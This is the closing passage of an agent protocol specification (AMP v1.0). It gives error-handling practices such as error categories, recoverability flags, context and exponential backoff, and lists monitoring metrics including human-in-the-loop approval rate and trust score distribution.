### 14.3 Error Handling

- **Categorize errors correctly**: config, network, auth, resource, runtime, dependency
- **Mark errors as recoverable** when possible — the Dashboard shows different UI for each
- **Include context** for debugging (provider name, status code, duration)
- **Report fatal errors before exit** — this ensures the Dashboard shows crash information
- **Use exponential backoff** for transient network errors (3 attempts)

### 14.4 Monitoring

**Key metrics to track:**
- Event throughput (events/sec)
- HITL approval rate
- Agent error rate
- LLM proxy success rate
- Trust score distribution

---

**End of AMP Protocol Specification v1.0**
